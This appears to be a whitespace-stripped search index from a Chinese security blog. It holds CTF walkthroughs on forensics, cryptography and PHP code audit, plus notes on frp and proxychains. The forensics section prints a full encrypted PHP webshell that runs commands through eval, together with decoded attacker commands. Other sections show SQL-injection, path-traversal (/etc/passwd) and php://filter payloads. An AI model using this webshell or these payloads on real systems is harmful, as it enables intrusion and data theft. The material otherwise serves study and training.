=/var/log/frps.loglog_level=infolog_max_days=3加上dashboard_addr=127.0.0.1一行配置即可；#netstat-antup|grepfrptcp00:::75000.0.0.0:*LISTEN5557/./frps#配置前#netstat-antup|grepfrptcp00127.0.0.1:75000.0.0.0:*LISTEN5557/./frps#配置后而nginx同理，修改sever区块监听即可server{listenlocalhost:8001;}值得注意的是：当nginx在处于运行中，配置本地监听后nginx-sreload是无法生效的，正确操作应该是nginx-sstop在启动。服务私有我们对公有云上的应用进行私有化后，假设现在需要访问应用，要怎么做呢？答：VPN代理（以下简称proxy）第一步：准备proxy连接文件（这里同样以frp为例）frpc-proxy.ini[common]server_addr={proxy_server_addr}server_port={proxy_server_port}token={your_token_value}[{some_word_descr_clien}]type=tcpremote_port={proxy_traffic_port}plugin=socks5plugin_user={proxy_server_username}plugin_passwd={proxy_server_pwd}...第二步：proxy_server端进行proxy启动，nohupfrps-cfrps.ini&amp;第三步：proxy_client连接启动，nohupfrps-cfrpc-proxy.ini&amp;第四步：测试。下面附上常见proxy软件：全局proxy终端proxy浏览器proxy备注Proxifierproxychains4很多-如上，我们就可以通过proxy的形式访问到私网应用；终端proxy连接ssh命令可以：proxychains4sshroot@{your_inside_ip}，同时不要忘记登录ECS控制台阻止ssh220.0.0.0/0即可，若proxy失效可以控制台连接私网地址或者重新放行公网ssh端口流量。$proxychains4sshroot@{your_inside_ip}···WelcometoAlibabaCloudElasticComputeService!Nomail.Lastlogin:ThuNov1111:49:012021from{your_inside_ip}root@bin4xin:~#proxychains4配置：/etc/proxychains.conf||/usr/local/etc/proxychains.conf=&gt;socks5{proxy_server_addr}{proxy_traffic_port}{proxy_server_username}{proxy_server_pwd}，mac终端记得要SIP关闭才可以使用pc4。总结实际上渗透测试就是模拟黑客的方法对系统和网络进行攻击性测试，目的是侵入系统，通过工具结合安全工程师的技术手段，发现应用系统在逻辑方面的安全风险隐患；而工作中常以黑、灰盒为主的渗透测试，公网居多，若能减少公网暴露面，在某种程度上来说是也是在公有私有云的边界处设置了一道阻碍，无形中给一些恶意利用者增加了攻击难度；当然这里只是简单介绍了一些常见的应用部署，能通过技术改变的还有很多，当然我们也可以发散思维来做到更多很酷的事情。"
  },

  {
    "title"    : "文章速览",
    "category" : "",
    "tags"     : "笔记, wiki",
    "url"      : "/top/2021/sentry-lab-markdown-usage/",
    "date"     : "Jul 31, 2021",
    "content"  : "Tips:表示新增表示修改表示升级表示引用或站点新增展示记录ClicktopreviewHomeArticlesreleasenotequickly时间操作书签2025/06/12《「安卓」:Xposed框架安装与模块开发》2025/06/12《「安卓」:Android安全测试工具集与实战应用》2025/06/12《「安卓」:MagiskRoot管理与模块系统》2025/06/12《「安卓」:Android开发环境配置与常见问题解决》2025/03/11《Android逆向学习》2025/03/11《AndroidSSLProxy配置》2025/03/11《AndroidFRIDA脚本系列》2024/07/18《「macOS」更新XZ|UpgradeYourXZVersion》2022/12/13《「OBSonMacOS13」:（悠雅de）录制桌面声音》2022/11/21《「Jekyll开发美化」:如何添加访客次数II（以翻页钟样式为例）》2022/11/18《「Jekyll开发美化」:如何添加访客次数I》2022/11/4《2022年全省通信和互联网行业职业技能竞赛WriteUp》2024/04/292022/10/8*NEW《::若依::vulnerabilitysummary》2022/10/212022/09/30*NEW《ICTnetworksecurityCTF2022walkthrough》2022/09/25《IndustrialInternetCTF2022walkthrough》2022/09/202022/04/5*NEW《未授权MongoDB：鸿门宴？》2022/09/272021/11/15*NEW《用GithubActions有感》2021/11/152021/10/26*NEW《备忘录》2021/11/112021/10/24*NEW《浅谈实际生产业务中公有云和私有云的边界》2021/12/152021/05/7*NEW《基于Modbus协议与KingView实现Openplc仿真通讯》2021/01/242021/03/13*NEW《用友NC6.5java反序列化》2021/03/13《CST2021年4月14日星期三：一次朔源事件的记录》2021/03/13《辛丑·本命年年后的一些思考》2020/09/25《有关于网络安全行业的一些思考》2022/10/82020/09/25*NEW《不得不谈的：「SpringBoot」未授权渗透》2020/09/11《「排错」：Docker启动vulnhub报错排错》2020/09/1《「技巧」：Linux&amp;UnixTerminal小技巧》2020/06/21《「安全工具」:A-Web_Vuln_Scan和aq域名爆破工具》2020/06/10《「Fuzz」:浅谈一些模糊匹配搜集信息的技巧》2021/03/192020/06/8*NEW《「信息搜集」:漫谈一些在内网的信息搜集技巧》2020/05/27《「Docker」:usedockerelegant:)》2020/05/26《「Struts2」:Apache-Struts2框架漏洞复现》2020/05/20《「BASH」:谈谈完全交互式的终端》2020/05/19《「fastjson」:浅谈json的反序列化》2020/05/17《「DOCKER」:谈谈docker逃逸那点事》2020/05/15《「渗透」:SQL注入新姿势:)》2020/05/15《「安卓」:使用rootCloak绕过root权限监测》2020/04/27《「渗透」:一句话反弹docker-shell》2020/04/1《「Terminal」:pip报错'unkown-encoding'》2020/01/21《「资产扫描」:Let'sGyoiThon!》2021/08/262020/01/19*NEW《Maven构建项目相关一揽子知识》2020/01/7《「笔记」：fortify-error-no-rules-file-found》2022/03/302019/12/31*NEW《「scrcpy」:Linux中优秀的投屏软件～》2019/12/30《「笔记」：反弹shell的几种方法》2022/10/202019/12/25*NEW《Mod-Security：有关「WAF」的爱恨情仇》2019/12/18《「安卓渗透」:AmazingdrozerScanningframe》2019/12/15《「安卓渗透」：Let'shookAPKwithfrida～》2019/12/7《NGINX笔记：http升级https协议》2019/12/4《「排错」：php-fpm解析404-notfound》2019/11/30《「安卓渗透」：天之骄子ADB》2021/06/272019/11/22*NEW《多子域：JEKYLL优雅地部署于NGINX》2019/11/21《Docker环境下T-pot蜜罐部署记录》2019/11/18《「笔记」：Jekyllforlinux.服务器部署历程》2019/09/1《「移植」UbuntuWithArm公网存储容器搭建记录》2019/09/1《「FINDOMAIN」：跨平台子域名搜集工具》2019/09/1《「渗透」SVG的神秘力量：minUv2》2019/07/15《「渗透」:PumpkinRaising-密码学的奥义》Others...palintext:codehline."
  },

  {
    "title"    : "CTF - 杂项",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/CTF-Misc-WalkThrough/",
    "date"     : "Jul 29, 2021",
    "content"  : "零：Misc文件隐写#0x00格式文件参考文件格式/头尾值RARArchive(rar)/文件头：52617221Wave(wav)/文件头：57415645JPEG(jpg)/文件头：FFD8FFPNG(png)/文件头：89504E47文件尾：0000000049454E44AE426082GIF(gif)/文件头：47494638ZIPArchive(zip)/文件头：504B0304文件尾：00000000TIFF(tif)/文件头：49492A00WindowsBitmap(bmp)/文件头：424DCAD(dwg)/文件头：41433130AdobePhotoshop(psd)/文件头：38425053RichTextFormat(rtf)/文件头：7B5C727466XML(xml)/文件头：3C3F786D6CHTML(html)/文件头：68746D6C3EEmailthoroughonly-(eml)/文件头：44656C69766572792D646174653AOutlookExpress(dbx)/文件头：CFAD12FEC5FD746FOutlook(pst)/文件头：2142444EMSWord/Excel(xls.or.doc)/文件头：D0CF11E0MSAccess(mdb)/文件头：5374616E64617264204AWordPerfect(wpd)/文件头：FF575043AdobeAcrobat(pdf)/文件头：255044462D312EQuicken(qdf)/文件头：AC9EBD8FWindowsPassword(pwl)/文件头：E3828596AVI(avi)/文件头：41564920RealAudio(ram)/文件头：2E7261FDRealMedia(rm)/文件头：2E524D46MPEG(mpg)/文件头：000001BAMPEG(mpg)/文件头：000001B3Quicktime(mov)/文件头：6D6F6F76WindowsMedia(asf)/文件头：3026B2758E66CF11MIDI(mid)/文件头：4D546864#0x01图片隐写题目1：word的本质根据题目标题和附件，猜测可能和word文件格式的后缀相关；给出的文件是word的本质的附件.docx给出一份word文档可以打开，内容如下：老规矩，binwalk查看一下文件➜binwalkword的本质的附件.docxDECIMALHEXADECIMALDESCRIPTION--------------------------------------------------------------------------------00x0Ziparchivedata,atleastv1.0toextract,name:_rels/···81390x1FCBZiparchivedata,atleastv1.0toextract,compressedsize:31149,uncompressedsize:31149,name:word/media/image1.jpg393390x99ABZiparchivedata,atleastv1.0toextract,compressedsize:19960,uncompressedsize:19960,name:word/media/image2.png···1054650x19BF9EndofZiparchive,footerlength:22看到是zip文件，直接➜mvword的本质的附件.docxword的本质的附件.zip，然后解压得到flag；image1.jpg是上面文档中的图片：题目2：简单的图片简单的图片的附件.zip➜binwalk简单的图片的附件.zipDECIMALHEXADECIMALDESCRIPTION--------------------------------------------------------------------------------00x0Ziparchivedata,atleastv2.0toextract,compressedsize:1214015,uncompressedsize:1226323,name:2.png12140500x128662Ziparchivedata,atleastv2.0toextract,compressedsize:1008239,uncompressedsize:1008124,name:1.png22224980x21E9A2EndofZiparchive,footerlength:22zip压缩包可以直接解压出两张看起来一摸一样的图片；同样的：使用binwalk分别查看一下两张图片：➜binwalk1.pngDECIMALHEXADECIMALDESCRIPTION--------------------------------------------------------------------------------00x0PNGimage,1080x720,8-bit/colorRGB,non-interlaced1790xB3Zlibcompresseddata,bestcompression3100640x4BB30MySQLMISAMcompresseddatafileVersion11➜binwalk2.pngDECIMALHEXADECIMALDESCRIPTION--------------------------------------------------------------------------------00x0PNGimage,1080x720,8-bit/colorRGB,non-interlaced注意到MySQLMISAMcompresseddatafileVersion11这一段，不知道是啥，全部提取出来康康：➜binwalk--dd=\".*\"1.png➜lltotal9880drwxr-xr-x6bin4xinstaff19281910:01./drwx------8bin4xinstaff25681909:49../-rw-r--r--1bin4xinstaff100812481909:490-rw-r--r--@1bin4xinstaff69806081909:494BB30-rw-r--r--1bin4xinstaff233352081909:49B3-rw-r--r--1bin4xinstaff100794581909:49B3.zlib➜file4BB304BB30:MySQLMyISAMindexfileVersion11,50404keyparts,19163uniquekeyparts,111keys,1846990095656532900records,1063746735895758743deletedrecords查了查资料是Mysql的存储文件，但是需要三个单独(.FRM/.MYD/.MYI)的文件才能查看mysql的数据，但是我们只有.MYI的文件。然后就这样一直卡着；直到看了解题思路：盲水印解题工具BlindWaterMark实测两张图片调整顺序不会影响最终结果：$pythonbwm.pydecode2.png1.pngResult-1.png$pythonbwm.pydecode1.png2.pngResult-2.png所以，如果遇到两张相同的图的题目没有思路，可以往盲水印考点上来靠靠。题目3：简单隐写，给出的是一张png图片：简单隐写的附件.pngTips:最近做其他题目思路顺手看了一下发现url不存在，应该是当时没传上去；找到文件附件在修改链接打开是一张空白的图片，高宽1195x1195#0x02音频隐写题目：去吧！追寻自由的电波题解；使用Audacity减慢播放速度即可。流量分析（.pacp）题#0x03SQL注入攻击timu.pcapng打开显示为注入payloadid=1'andascii(substr((selectflagfromt),1,1))=33--，是使用二分法判断SQL语句执行对应的Ascii字符是否相等：所以直接来看一下返回包的页面是否有不同的地方：Analyze-&gt;Follow-&gt;TCP/HTTPStream两边不同显示：左边为错误Ascii，右边为正确的Ascii，按照顺序(substr((selectflagfromt),1,1)-&gt;(n,1)得到：GET/ctf/Less-5/?id=1'andascii(substr((selectflagfromt),1,1))=102--HTTP/1.1GET/ctf/Less-5/?id=1'andascii(substr((selectflagfromt),2,1))=108--HTTP/1.1GET/ctf/Less-5/?id=1'andascii(substr((selectflagfromt),3,1))=97--HTTP/1.1GET/ctf/Less-5/?id=1'andascii(substr((selectflagfromt),4,1))=103--HTTP/1.1···查一下Ascii字母表得到flag：1021089710312311949114101115104658275951011229549115110116105116125#-&gt;flag{w1reshARK_ez_1snt}#0x04[…]usb流量分析[…]#0x05取证/攻击行为无题目描述；给出的是一份流量文件：backdoor.pcapng打开一看映入眼帘的是一系列SQL注入的payload：File-&gt;ExportObjects-&gt;HTTP导出几个出来看看，得到一些数据库的信息：往下就是Login.phpPOST包登录成功的信息：POST/login.phpHTTP/1.1···username=admin&amp;password=mysql&amp;button=SIGN-INHTTP/1.1302FoundLocation:./admin/index.php接着往下，获取到了一些有用的信息，流量显示Upload.phpPost上传成功了一个php马：&lt;?phpsession_start();@set_time_limit(0);\t@error_reporting(0);functionE($D,$K){for($i=0;$i&lt;strlen($D);$i++){$D[$i]=$D[$i]^$K[$i+1&amp;15];}#E函数为异或加密return$D;}functionQ($D){returnbase64_encode($D);}#Q函数为base64编码functionO($D){returnbase64_decode($D);}#O函数为base64解码$P='pass';#木马连接参数$V='payload';#执行载荷$T='3c6e0b8a9c15224a';#加密密钥if(isset($_POST[$P])){$F=O(E(O($_POST[$P]),$T));if(isset($_SESSION[$V])){$L=$_SESSION[$V];$A=explode('|',$L);classC{publicfunctionnvoke($p){eval($p.\"\");}}$R=newC();\t\t\t$R-&gt;nvoke($A[0]);echosubstr(md5($P.$T),0,16);echoQ(E(@run($F),$T));echosubstr(md5($P.$T),16);}else{$_SESSION[$V]=$F;}}#/upload/1615384904.php上传成功，为1615384904.php那么我们只需要关注1615384904.php攻击者操作木马进行了哪些操作就好；全部导出，操作流量全加密类似请求POST：pass=OgRUWzZ%2FDUw5ZQRbYXFQfylbVFwGfwlPOXQAWlBjNAo0Wg1fAH4KTjdfb1tkTidcOltUYjJpXAQ%3D返回：11cd6a8758984163LmIwSi9SBgguZXwBfFkRSQEEUXsvbDRDLltSA39gKAYtdVBHA3Agci5lYEh/XgYCLmIoSCxRVE4CeXR5f2A4Sy1iKAQsfApOLXIARVN8IHg=6c37ac826a2a04bc查看代码逻辑：post传入参数pass-&gt;$T密钥加密-&gt;$V传入classC进而传入eval函数进行命令执行，所以我们下一步需要做的是破解木马的加密方式，解密代码解得上面的POST请求为：返回：#cmdLine=bHMK&amp;methodName=ZXhlY0NvbW1hbmQ=-&gt;base64decode-&gt;cmdLine=ls&amp;methodName=execCommand1532851276json1532851294.php1532851316.php1615384904.php进一步分析得到备份命令：cmdLine=zipwww.zip-rP$APACHE_RUN_USER/var/www/html/&amp;methodName=execCommand从流量文件中找到www.zip导出，解压密码是$APACHE_RUN_USER也是从流量中执行env命令cmdLine=ZW52Cg==&amp;methodName=ZXhlY0NvbW1hbmQ=解密得到：APACHE_RUN_DIR=/var/run/apache2APACHE_PID_FILE=/var/run/apache2/apache2.pidPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAPACHE_LOCK_DIR=/var/lock/apache2LANG=CAPACHE_RUN_USER=www-dataAPACHE_RUN_GROUP=www-dataAPACHE_LOG_DIR=/var/log/apache2PWD=/app/admin/upload所以密码就是www-data，然后根据http流量包把zip文件解压出来，我们找到下载zip文件流量包的反包：选择反包-&gt;文件-&gt;ExportpacketBytes/导出数据包字节流解压zip文件，html目录下php代码发现flag.php：&lt;?php$enc='aes-128-ecb';$flag='CN1Sq9tFItxZhsu3zCWbrdf6ozOL4eoKG0s71vGg/AKKnch3IL3jzwtXeCgWK5QP';?&gt;观察目录下发现存在被修改的php代码：（以下为参考教程给出-。-）使用后加的代码对空白字符进行解码，并file_put_contents('tmp2.txt',base64_decode($out));输出到tmp2.txt文件中，同样文件中输出也有空白字符，再次解码即可；解码代码使用获得的key在线解密aes-128-ecb算法，得到flag：DASCTF{d8f191d0f0be0f039c4ededb7839218e}#0x06[…]上传/下载文件[…]"
  },

  {
    "title"    : "CTF - 密码学与杂项",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/CTF-Crypto-and-Misc-etc-WalkThrough/",
    "date"     : "Jul 29, 2021",
    "content"  : "零：CryptoRSA题型Tips：RSA加解密的算法完全相同，公钥加密体制中，一般用公钥加密，私钥解密，设c为明文，m为密文；公式如下：\\[c≡m^emod\\quadn\\\\m≡c^dmod\\quadn\\]RSA的算法涉及三个参数，n、e、d：n是两个大质数p、q的积，n的二进制表示所占用的位数，就是所谓的密钥长度；e和d是一对相关的值，e可以任意取，但要求e与(p-1)(q-1)互质，再选择d；其中，p、q为质数，n、e、d计算如下：\\[n=p*q\\]\\[ø(n)=(p-1)*(q-1)\\]\\[ed≡1\\mod\\ø(n)\\]（n，e),(n，d)就是密钥对。其中(n，e)为公钥，(n，d)为私钥。#0x01公钥加密文题干：给出公钥文件：.pem/.pub后缀文件、密文：.enc之类后缀的文件；例题1例题2解法：分析pem/pub文件恢复私钥，通过私钥对enc文件进行解密得到flag；例题1文件如下：➜ll-rw-r--r--@1bin4xinstaff324292016flag.enc-rw-r--r--@1bin4xinstaff1384292016pubkey.pem➜fileflag.encflag.enc:data➜filepubkey.pempubkey.pem:ASCIItext➜catpubkey.pem-----BEGINPUBLICKEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----ENDPUBLICKEY-----解(3summer/CTF-RSA-tool)：solve.py--verbose-kpubkey.pem--decryptflag.enc`同样的：例题2类似：$rsatools--publickeypublic.pem--uncipherfileflag.encprivateargumentisnotset,theprivatekeywillnotbedisplayed,evenifrecovered.[*]Testingkeypublic.pem.[*]Performingpastctfprimesattackonpublic.pem.90%|█████████████████████████████████████████████████████████████████████▌/102/113[00:00&lt;00:00,1445.70it/s][*]Attacksuccesswithpastctfprimesmethod!Resultsforpublic.pem:Unciphereddata:HEX:0x61666374667b5235345f7c355f24305f423072696e397dINT(bigendian):9329062300443879711046737916988523093598680555377801597INT(littleendian):11994109012077315504651226639166102749077267728721733217utf-8:afctf{R54_|5_$0_B0rin9}STR:b'afctf{R54_|5_$0_B0rin9}'···#0x02文本赛题给出一段文本，主要考察RSA公式的用法，考虑已知变量，使用什么攻击手法；题干：在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17，求解出d直接用后面三个公式：\\[n=pq=473398607161*4511491\\\\ø(n)=(473398607161-1)*(4511491-1)\\\\17*d≡1\\mod\\ø(n)\\]也就是：\\[\\frac{17d-1}{ø(n)}=int()=\\frac{17d-1}{2135733082216268400}\\\\d=\\frac{2135733082216268401}{17}=125631357777427553\\]同样也可以通过rsatools来解：➜ln-s/{path/to}/CTF-RSA-tool/solve.py/usr/local/bin/rsatools➜rsatools--verbose--private-N2135733555619387051-e17-p473398607161-q4511491#0x03流量（.pcap）文件有时出题人会给你一个流量包，你需要用wireshark等工具分析，然后根据流量包的通信信息，分析题目考察的攻击方法，你可以提取出所有你解题需要用到的参数，然后进行解密举例题目暂时没有遇到，有的话会补上[…]#0x04本地脚本分析题目会给你一个脚本和一段密文，一般为python编写，你需要逆向文件流程，分析脚本的加密过程，写出对应的解密脚本进行解密fromCrypto.Util.numberimport*importbinasciiimportgmpy2flag='*****************************************'hex_flag=int(flag.encode(\"hex\"),16)p=getPrime(256)q=getPrime(256)n=p*qe=0x3c1=pow(hex_flag,e,n)c2=pow(hex_flag+1,e,n)print(\"n=\",hex(n))print(\"e=\",hex(e))print(\"c1=\",hex(c1))print(\"c2=\",hex(c2))#('n=','0xb28ae8f29f8b90e8b8c5667b2b71e49929446b41f7f7a3e9e45bc52a1e8c45d59c1788be48a9c365d51feee0b2cd3295001cdad1ba5ccf808686b5ce5a269ae5L')#('e=','0x3')#('c1=','0x7ba5502ecbc3b15ad8c2db8f30a593eb062dde4d7dfacadf0a28291d1a576389a18dfba0607c0243f843f637449089dd2090d47ee9845d4147f02afd4d891f19L')#('c2=','0x891ac4f663df41c1f6433ee3513d749c3ba02fe0aacd7f51d791b9bac4f7e5194bd484d78d972c344faf600f7d3aa580485774768efc47ab8ddb67eeeb330fa1L')如上所示，已知n、e、c1、c2和、c2的表达式；我们可以求出hex_flag的值：\\[\\left\\{\\begin{aligned}c1≡hexflag^3&amp;(mod\\quadn)\\\\c2≡(hexflag+1)^3&amp;(mod\\quadn)\\\\\\end{aligned}\\right.\\]Tips：这里pow(a,b,c)的意思就是取模，为：\\[pow(a,b,c)=a^bmod\\quadc\\\\eg:7^1mod\\3=1\\]&gt;&gt;&gt;a=7&gt;&gt;&gt;b=1&gt;&gt;&gt;c=3&gt;&gt;&gt;n=pow(a,b,c)&gt;&gt;&gt;printn看起来很简单，把hex_flag算出来自然flag就出来了，但是实际上我们需要做的是把上面的数学公式输出成代码，因为给出的已知数太大；所以需要公式推导来生成代码：\\[\\because\\quadc=pow(mm+padding,e,n)\\\\\\therefore\\quad\\left\\{\\begin{aligned}c_1≡(m+padding_1)^e&amp;(modn)\\\\c_2≡(m+padding_2)^e&amp;(modn)\\\\\\end{aligned}\\right.\\\\令：m_1=m+padding_1,m_2=m+padding_2;\\\\\\therefore\\quadm_1-m_2=padding_1-padding_2\\\\\\therefore\\quad\\left\\{\\begin{aligned}f(x)=ax+b\\\\m_1=m_2+(padding_1+padding_2)\\\\\\end{aligned}\\right.\\\\\\therefore\\quadf(m_1)=am_2+b\\\\由\\c≡m^e\\mod\\n，代入c_1、c_2\\\\\\therefore\\quad\\left\\{\\begin{aligned}c_1≡m_1^e&amp;(mod\\n)\\\\c_2≡m_2^e&amp;(mod\\n)\\\\\\end{aligned}\\right.\\\\又\\because\\m_1=am_2+b\\\\\\therefore\\quad\\left\\{\\begin{aligned}c_1≡(am_2+b)^e&amp;(mod\\n)\\\\c_2≡m_2^e&amp;(mod\\n)\\\\\\end{aligned}\\right.\\\\代入e=3，展开\\\\\\therefore\\quad(am_2+b)^3=a^3m_2^3+3b(am_2)^2+3am_2b^2+b^3\\\\\\therefore\\quadc_1≡a^3m_2^3+3b(am_2)^2+3am_2b^2+b^3mod\\n\\\\\\therefore\\quadc_1≡a^3m_2^3+3ba^2m_2^2+3b^2am_2+3b^3-2b^3mod\\n\\\\\\therefore\\quadc_1-a^3m_2^3+2b^3≡3b(a^2m_2^2+bam_2+b^2)mod\\n\\\\又\\because\\quad(am_2)^3-b^3≡(am_2-b)(a^2m_2^2+bam_2+b^2)\\\\\\therefore\\quad\\left\\{\\begin{aligned}c_1-a^3m_2^3+2b^3≡3b(a^2m_2^2+bam_2+b^2)mod\\n\\qquad(1)\\\\(am_2)^3-b^3≡(am_2-b)(a^2m_2^2+bam_2+b^2)mod\\n\\qquad(2)\\\\c_2≡m_2^3\\mod\\n\\qquad(3)\\\\\\end{aligned}\\right.\\\\\\therefore\\quad\\left\\{\\begin{aligned}(am_2-b)(c_1-a^3m_2^3+2b^3)≡(am_2-b)[3b(a^2m_2^2+bam_2+b^2)]mod\\n\\\\3b[(am_2)^3-b^3]≡3b(am_2-b)(a^2m_2^2+bam_2+b^2)mod\\n\\\\\\end{aligned}\\right.\\\\\\therefore\\quad(am_2-b)(c_1-a^3m_2^3+2b^3)≡3b[(am_2)^3-b^3]mod\\n\\\\代入：(c_1-a^3c_2+2b^3)(am_2-b)≡3b(a^3c_2-b^3)mod\\n\\\\\\because\\quadm=m_2-padding_2\\\\\\therefore\\quadm≡(\\frac{3b(a^3c_2-b^3)}{c_1-a^3c_2+2b^3}+b)\\a-padding2\\mod\\n(求a的逆元)\\\\\\]既然推导出了公式，写脚本即可importgmpyimportbinasciidefgetM2(a,b,c1,c2,n,e):\ta3=pow(a,e,n)\tb3=pow(b,e,n)\tfirst=c1-a3*c2+2*b3\tprint(\"first:\")\tprint(first)\tfirst=first%n\tsecond=e*b*(a3*c2-b3)\tsecond=second%n\tthird=second*gmpy.invert(first,n)\tthird=third%n\tfourth=(third+b)*gmpy.invert(a,n)\treturnfourth%ne=0x3a=1b=-1#padding1-padding2c1=0x7ba5502ecbc3b15ad8c2db8f30a593eb062dde4d7dfacadf0a28291d1a576389a18dfba0607c0243f843f637449089dd2090d47ee9845d4147f02afd4d891f19c2=0x891ac4f663df41c1f6433ee3513d749c3ba02fe0aacd7f51d791b9bac4f7e5194bd484d78d972c344faf600f7d3aa580485774768efc47ab8ddb67eeeb330fa1padding2=1#padding2n=0xb28ae8f29f8b90e8b8c5667b2b71e49929446b41f7f7a3e9e45bc52a1e8c45d59c1788be48a9c365d51feee0b2cd3295001cdad1ba5ccf808686b5ce5a269ae5m=getM2(a,b,c1,c2,n,e)-padding2#printm#printhex(m)#printbinascii.unhexlify(hex(m))print(binascii.unhexlify(hex(m)[2:].strip(\"L\")))binascii.unhexlify：返回由十六进制字符串hexstr表示的二进制数据。此函数功能与b2a_hex()相反。hexstr必须包含偶数个十六进制数字（可以是大写或小写），否则会引发Error异常。算法解密#0x05栅栏算法题目描述：被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走，一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。题干：给出文件字符串ccehgyaefnpeoobe{lcirg}epriec_ora_g栅栏里面喂5只小鸡；栅栏算法，5#0x06凯撒密码[…]#0x07摩尔斯电码·morse题干1：给出一串数字1111101000001010111100000000000111001010010000010010110，根据1高位/0低位转换为摩丝码最终转换即可值得注意的是，就如上面的题干一样，有时给出的题目不一定会那么耿直让你一眼看出来或者用工具转换出来，需要做一些其他的转换：题干2:--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-很明显题1是空格分割，那么题2就是/分割，当然也可以把斜杠换成空格在转换，都是一样的；通过算法转换后给出：MAY_BE_HAVE_ANOTHER_DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA很明显是2次加密，AB混合的字符串；有CryptoCTF经验的大手子们一眼就能看出来，培根编码：小写：&gt;&gt;&gt;s=\"ATTACKANDDEFENCEWORLDISINTERESTING\"&gt;&gt;&gt;print(s.lower())attackanddefenceworldisinteresting参考RSA算法原理（一）RSA算法原理（二）CTF中RSA题型解题思路及技巧RSA加密算法主要公式浅析RSAPaddingAttack"
  },

  {
    "title"    : "CTF - 代码审计向",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/CTF-Code-Audit-WalkThrough/",
    "date"     : "Jul 27, 2021",
    "content"  : "零：WEB#0x01任意文件读取绕过先看if判断主逻辑，同时满足下列三个条件即可：if(!empty($_REQUEST['file'])传入file参数不为空，不多说；&amp;&amp;is_string($_REQUEST['file'])传入file参数是字符串；传入file参数满足emmm类的checkFile函数，主要看这个函数，传入checkFile函数的file参数被重新接受为page参数，判断参数是否为空、是否为字符串，是则往下：&amp;&amp;emmm::checkFile($_REQUEST['file']))检查$page在不在数组$whitelist里$whitelist=[\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"];if(in_array($page,$whitelist)){returntrue;}对传入参数进行一次url解码往下；$_page=mb_substr($page,0,mb_strpos($page.'?','?'));先看mb_strpos，就是？在$page里第一次出现的位置再看mb_substr，只留了$page从0到？的位置；对_page重复1；对_page重复2；对_page重复3；再次判断参数重复1；include$_REQUEST['file'];&lt;?phphighlight_file(__FILE__);classemmm{publicstaticfunctioncheckFile(&amp;$page){$whitelist=[\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"];if(!isset($page)||!is_string($page)){echo\"youcan'tseeit\";returnfalse;}if(in_array($page,$whitelist)){returntrue;}$_page=mb_substr($page,0,mb_strpos($page.'?','?'));if(in_array($_page,$whitelist)){returntrue;}$_page=urldecode($page);$_page=mb_substr($_page,0,mb_strpos($_page.'?','?'));if(in_array($_page,$whitelist)){returntrue;}echo\"youcan'tseeit\";returnfalse;}}if(!empty($_REQUEST['file'])&amp;&amp;is_string($_REQUEST['file'])&amp;&amp;emmm::checkFile($_REQUEST['file'])){include$_REQUEST['file'];exit;}else{echo\"&lt;br&gt;&lt;imgsrc=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\"/&gt;\";}只要我们构造的参数满足上述步骤绕过：file=source.php%3f../../../../../../../../../../../../etc/passwd然后根据题目提示读取flag文件。参考PHP:is_string-ManualPHP:mb_strpos-ManualXCTF-WarmupWriteup#0x02NaNNaNNaNNaN-Batman：奇妙的jsNaNNaNNaNNaN-Batman附件文本编辑器打开发现&lt;script&gt;_='function$()超文本标签，修改为html后缀，同时修改eval(_)为alert(_)处理后如下：function$(){vare=document.getElementById(\"c\").value;if(e.length==16)if(e.match(/^be0f23/)!=null)if(e.match(/233ac/)!=null)if(e.match(/e98aa$/)!=null)if(e.match(/c7be9/)!=null){vart=[\"fl\",\"s_a\",\"i\",\"e}\"];varn=[\"a\",\"_h0l\",\"n\"];varr=[\"g{\",\"e\",\"_0\"];vari=[\"it'\",\"_\",\"n\"];vars=[t,n,r,i];for(varo=0;o&lt;13;++o){document.write(s[o%4][0]);s[o%4].splice(0,1)}}}document.write('&lt;inputid=\"c\"&gt;&lt;buttononclick=$()&gt;Ok&lt;/button&gt;');delete_根据if判断逻辑内的定义console输出：#0x03php伪协议本题思路：index.php对应file参数读取文件但是过滤了关键词flag，同时给出关键文件secure.phpsecure.php对应输出flag的逻辑；secure.php尝试读取对应php文件代码：读取payloadindex.php?file=php://filter/read=convert.base64-encode/resource=secure.phpsecure.php➜echoPG1ldGEgY2hhcnNld